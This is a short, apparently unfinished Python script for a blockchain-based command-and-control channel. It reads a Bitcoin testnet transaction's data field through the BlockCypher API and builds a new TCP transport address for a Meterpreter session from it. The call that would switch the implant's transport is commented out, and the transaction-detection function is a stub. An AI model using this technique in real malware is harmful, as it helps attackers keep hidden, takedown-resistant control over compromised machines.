
import urllib, json, time
# import meterpreter.transport



def detect_transactions(addr):
    print("detecting transactions")
    return 1



def query_transaction(curr_transport, txid):

        url = "http://api.blockcypher.com/v1/btc/test3/txs/" + txid
        response = urllib.urlopen(url)
        data = json.load(response)

        if( data['outputs'][0]['data_string']):
            transport_url = 'tcp://' +  data['outputs'][0]['data_string']
            if(transport_url != curr_transport):
                curr_transport = transport_url
                # meterpreter.transport.add(transport_url)
                print("NEW TRANSPORT: " + transport_url)
                # new_txid = detect_transactions(data['outputs'])
                # return new_txid
        else:
            time.sleep(15)
            query_transaction(curr_transport, txid)


# if __name__ == "__main__":
curr_transport = '127.0.0.1:9090'
txid = "2599dbe540a583ede3512fef9a0f26be718c039ffd4d04d85ff3b339f40e73b1"
query_transaction(curr_transport, txid)
print("NEW TXID:")
url = "http://api.blockcypher.com/v1/btc/test3/txs/" + "2599dbe540a583ede3512fef9a0f26be718c039ffd4d04d85ff3b339f40e73b1"
response = urllib.urlopen(url)
data = json.load(response)
detect_transactions(data['outputs'])
